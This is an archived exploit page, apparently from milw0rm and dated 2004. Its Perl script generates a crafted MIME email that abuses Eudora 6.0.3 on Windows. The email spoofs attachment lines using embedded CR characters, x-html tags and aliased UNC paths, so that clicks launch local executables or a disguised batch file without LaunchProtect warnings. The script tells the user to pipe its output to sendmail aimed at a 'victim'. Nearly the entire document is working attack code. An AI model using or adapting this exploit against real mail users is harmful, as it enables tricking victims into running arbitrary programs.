<html><head><title>Eudora 6.0.3 Attachment Spoofing Exploit (windows)
</title></head><pre>#!/usr/bin/perl --

use MIME::Base64;

print &quot;From: me\n&quot;;
print &quot;To: you\n&quot;;
print &quot;Subject: Eudora 6.0.3 on Windows spoof, LaunchProtect\n&quot;;
print &quot;MIME-Version: 1.0\n&quot;;
print &quot;Content-Type: multipart/mixed; boundary=\&quot;zzz\&quot;\n&quot;;
print &quot;\n&quot;;
print &quot;This is a multi-part message in MIME format.\n&quot;;
print &quot;--zzz\n&quot;;
print &quot;Content-Type: text/plain\n&quot;;
print &quot;Content-Transfer-Encoding: 7bit\n&quot;;
print &quot;\n&quot;;

print &quot;Pipe the output of this script into:   sendmail -i victim\n&quot;;

print &quot;\nWith spoofed attachments, we could 'steal' files if the 
message
was forwarded (not replied to).\n&quot;;

print &quot;\nWithin plain-text email (or plain-text, inline MIME parts) 
embedded
CR=x0d characters get converted internally into a NUL=x00 and ignored,
so we can spoof \&quot;attachment converted\&quot; lines:\n&quot;;

print &quot;\nThe following work fine (but are boring and/or put up 
warnings):\n&quot;;
print &quot;Attachment Converted\r: \&quot;c:\\winnt\\system32\\calc.exe\&quot;\n&quot;;
print &quot;Attachment Converted\r: c:\\winnt\\system32\\calc.exe\n&quot;;
print &quot;(Note how JavaScript is done with IE, web with default browser 
Netscape)\n&quot;;
print &quot;Attachment Converted\r: &lt;A 
href=javascript:alert(%27hello%27)&gt;hello.txt&lt;/a&gt;\n&quot;;
print &quot;Attachment Converted\r: &lt;A 
href=http://www.maths.usyd.edu.au:8000/u/psz/securepc.html#Eudoraxx&gt;web.txt&lt;/a&gt;\n&quot;;
print &quot;Attachment Converted\r: &lt;A 
href=c:/winnt/system32/calc.exe&gt;file.txt&lt;/a&gt;\n&quot;;

print &quot;\nIf we can guess the full path to the attach directory then can
change the name shown to anything we like, but get broken icon:\n&quot;;
print &quot;Attachment Converted\r: &lt;A 
href=H:/eudora/attach/calc&gt;file.txt&lt;/a&gt;\n&quot;;

print &quot;\nCuteness value only:\n&quot;;
print &quot;Attachment Converted\r: &lt;A 
href=c:/winnt/system32/calc.exe&gt;file1.txt&lt;/a&gt; xyz &lt;A href=c:/winnt/system32/calc.exe&gt;file2.txt&lt;/a&gt;\n&quot;;

print &quot;\n&lt;x-html&gt;
With &lt;b&gt;HTML&lt;/b&gt; &lt;i&gt;inclusions&lt;/i&gt; we can do
&lt;a href=c:/winnt/system32/calc.exe&gt;file&lt;/a&gt;,
&lt;a 
href=\&quot;http://www.maths.usyd.edu.au:8000/u/psz/securepc.html#Eudoraxx\&quot;&gt;http&lt;/a&gt;
and
&lt;a href=\&quot;javascript:alert(\x27hello\x27)\&quot;&gt;javascript&lt;/a&gt;
references. Any way to exploit this?
&lt;/x-html&gt;\n&quot;;

print &quot;\n&lt;x-rich&gt;
Can also do RTF inclusions. Can this be abused?
&lt;/x-rich&gt;\n&quot;;

print &quot;\nThose &lt;x-xyz&gt;&lt;/x-xyz&gt; constructs allow spoofing
attachments easily, without embedded CR:\n\n&quot;;
print &quot;HTML\n&quot;;
print &quot;&lt;x-html&gt;&lt;/x-html&gt;Attachment Converted: \&quot;xyz\&quot;\n&quot;;
print &quot;Rich\n&quot;;
print &quot;&lt;x-rich&gt;&lt;/x-rich&gt;Attachment Converted: \&quot;xyz\&quot;\n&quot;;
print &quot;Flowed\n&quot;;
print &quot;&lt;x-flowed&gt;&lt;/x-flowed&gt;Attachment Converted: \&quot;xyz\&quot;\n&quot;;

print &quot;\n&quot;;

print &quot;\n--zzz\n&quot;;
print &quot;Content-Type: text/plain; name=\&quot;plain.txt\&quot;\n&quot;;
print &quot;Content-Transfer-Encoding: 7bit\n&quot;;
print &quot;Content-Disposition: inline; filename=\&quot;plain.txt\&quot;\n&quot;;
print &quot;\n&quot;;
print &quot;Within a 'plain' attachment:\n&quot;;
print &quot;Attachment Converted\r: \&quot;c:\\winnt\\system32\\calc.exe\&quot;\n&quot;;

print &quot;\n--zzz\n&quot;;
print &quot;Content-Type: text/plain; name=\&quot;qp.txt\&quot;\n&quot;;
print &quot;Content-Transfer-Encoding: quoted-printable \n&quot;;
print &quot;Content-Disposition: inline; filename=\&quot;qp.txt\&quot;\n&quot;;
print &quot;\n&quot;;
print &quot;Within quoted-printable encoded parts still need the embedded 
CR:\n&quot;;
print &quot;=41ttachment=20=43onverted\r=3a 
\&quot;c:\\winnt\\system32\\calc.exe\&quot;\n&quot;;

print &quot;\n--zzz\n&quot;;
print &quot;Content-Type: text/plain; name=\&quot;b64.txt\&quot;\n&quot;;
print &quot;Content-Transfer-Encoding: base64\n&quot;;
print &quot;Content-Disposition: inline; filename=\&quot;b64.txt\&quot;\n&quot;;
print &quot;\n&quot;;
$z = &quot;Within base64 encoded (plain-text, inline) MIME parts, can 
spoof\r
without embedded CR (but line termination is CR-NL):\r
Attachment Converted: \&quot;c:\\winnt\\system32\\calc.exe\&quot;\r\n&quot;;
print encode_base64($z);

print &quot;\n--zzz\n&quot;;
print &quot;Content-Type: text/plain\n&quot;;
print &quot;Content-Transfer-Encoding: 7bit\n&quot;;
print &quot;\n&quot;;

print &quot;\n=====\n&quot;;

$X = 'README'; $Y = &quot;$X.bat&quot;;
print &quot;\nThe X - X.exe dichotomy: send a plain $X attachment:\n&quot;;
$z = &quot;rem Funny joke\r\npause\r\n&quot;;
print &quot;begin 600 $X\n&quot;, pack('u',$z), &quot;`\nend\n&quot;;
print &quot;\nand (in another message or) after some blurb so is scrolled 
off in
another screenful, also send $Y. Clicking on $X does not
get it any more (but gets $Y, with a LauchProtect warning):\n&quot;;
$z = &quot;rem Big joke\r\nrem Should do something nasty\r\npause\r\n&quot;;
print &quot;begin 600 $Y\n&quot;, pack('u',$z), &quot;`\nend\n&quot;;

print &quot;\n=====\n&quot;;

print &quot;
Eudora 6.0.3 LaunchProtect handles the X-X.exe dichotomy in the attach
directory only, and allows spoofed attachments pointing to an 
executable
stored elsewhere to run without warning:\n&quot;;
print &quot;Attachment Converted\r: &lt;a 
href=c:/winnt/system32/calc&gt;go.txt&lt;/a&gt;\n&quot;;
print &quot;Attachment Converted\r: c:/winnt/system32/calc\n&quot;;

print &quot;
Can be exploited if there is more than one way into attach: in my setup
H: and \\\\rome\\home are the same thing, but Eudora does not know 
that.\n&quot;;
print &quot;These elicit warnings:\n&quot;;
print &quot;Attachment Converted\r: &lt;a 
href=h:/eudora/attach/README&gt;readme.txt&lt;/a&gt;\n&quot;;
print &quot;Attachment Converted\r: h:/eudora/attach/README\n&quot;;
print &quot;Attachment Converted\r: \\README\n&quot;;
print &quot;Attachment Converted\r: .\\README\n&quot;;
print &quot;Attachment Converted\r: \\.\\README\n&quot;;
print &quot;Attachment Converted\r: ?\\README\n&quot;;
print &quot;Attachment Converted\r: \\?\\README\n&quot;;
print &quot;while these do the bad thing without warning:\n&quot;;
print &quot;Attachment Converted\r: &lt;a 
href=file://rome/home/eudora/attach/README&gt;readme&lt;/a&gt;\n&quot;;
print &quot;Attachment Converted\r: //rome/home/eudora/attach/README\n&quot;;
print &quot;Attachment Converted\r: 
\\\\rome\\home\\eudora\\attach\\README\n&quot;;

print &quot;
For the default setup, Eudora knows that C:\\Program Files
and C:\\Progra~1 are the same thing:\n&quot;;
print &quot;Attachment Converted\r: \&quot;c:/program 
files/qualcomm/eudora/attach/README\&quot;\n&quot;;
print &quot;Attachment Converted\r: 
\&quot;c:/progra~1/qualcomm/eudora/attach/README\&quot;\n&quot;;
print &quot;
and also knows that various UNC references:
\\\\localhost\\c...
\\\\127.0.0.1\\c...
\\\\BIOSNAME\\c...
\\\\DNSNAME\\c...
\\\\IP\\c...
\\\\\\?\\c...
\\\\c...
...c:\\progr...
...c\\progr...
...c:progr...
...program files\\...
...progra~1\\...
or even
.\\NoSuchDir\\..\\README
//c|\\Program Files\\qualcomm\\eudora\\attach\\README
\\\\c|\\Program Files\\qualcomm\\eudora\\attach\\README
res://c:\\Program Files\\qualcomm\\eudora\\attach\\README
res:\\\\c:\\Program Files\\qualcomm\\eudora\\attach\\README
shell:Fonts\\..\\..\\Program Files\\qualcomm\\eudora\\attach\\README
%ProgramFiles%\\qualcomm\\eudora\\attach\\README
%windir%\\..\\Program Files\\qualcomm\\eudora\\attach\\README
are all the same thing...
&quot;;

print &quot;\n&quot;;
print &quot;\n--zzz--\n&quot;;
print &quot;\n&quot;;

# milw0rm.com [2004-03-19]</pre></html>